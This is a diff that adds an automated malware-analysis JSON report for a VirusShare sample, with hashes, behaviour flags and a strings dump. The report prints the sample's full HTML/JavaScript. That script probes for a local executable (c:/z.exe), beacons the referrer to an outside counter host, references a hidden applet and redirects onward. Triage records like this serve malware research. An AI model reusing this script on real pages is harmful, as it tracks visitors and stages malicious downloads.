@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "<HTML>\n\n<body onLoad=\"chek();\">\n<!-- ET ARCHIVE=\"archive.jar\" CODE=\"BlackBox.class\" WIDTH=1 HEIGHT=1></APPL-->\n<script language=JavaScript1.2>\ndocument.write(\"<img height='1' width='1' src='http://www.bestamateurs.net/cgi-bin/counter.cgi?1072272490&\"+document.referrer+\"'>\");\n</script>\n<script id=onoff></script>\n<script>\nfileExists = false\nwindow.onerror = errHandler;\nfunction errHandler(){\nfileExists = true;\nreturn true;\n}\nfunction chek(){\nvar sURL = \"file:///c:/z.exe\" \ndocument.scripts['onoff'].src = sURL;\nsetTimeout(\"writeResult()\",100);\n}\nfunction writeResult(){\nif(fileExists==false){location = \"e2.htm\";}\n}\n</script>\n\n</BODY></HTML>"
+    },
+    "filename": "VirusShare_3c45de67ab425183c572492556b139a9",
+    "filesize": 668,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c45de67ab425183c572492556b139a9",
+        "sha1": "0695dfbae7944ac15b60e5730f86f224576a9c96",
+        "sha256": "c0491f5bfad35c8900df08d2d752a1dbdf751fe9b0143a63c09ffff5aa943b99"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTML>",
+            "<body onLoad=\"chek();\">",
+            "<!-- ET ARCHIVE=\"archive.jar\" CODE=\"BlackBox.class\" WIDTH=1 HEIGHT=1></APPL-->",
+            "<script language=JavaScript1.2>",
+            "document.write(\"<img height='1' width='1' src='http://www.bestamateurs.net/cgi-bin/counter.cgi?1072272490&\"+document.referrer+\"'>\");",
+            "</script>",
+            "<script id=onoff></script>",
+            "<script>",
+            "fileExists = false",
+            "window.onerror = errHandler;",
+            "function errHandler(){",
+            "fileExists = true;",
+            "return true;",
+            "function chek(){",
+            "var sURL = \"file:///c:/z.exe\" ",
+            "document.scripts['onoff'].src = sURL;",
+            "setTimeout(\"writeResult()\",100);",
+            "function writeResult(){",
+            "if(fileExists==false){location = \"e2.htm\";}",
+            "</script>",
+            "</BODY></HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.bestamateurs.net/cgi-bin/counter.cgi?1072272490&",
+            "file:///c:/z.exe"
+        ]
+    },
+    "time": "0:00:00.257487",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
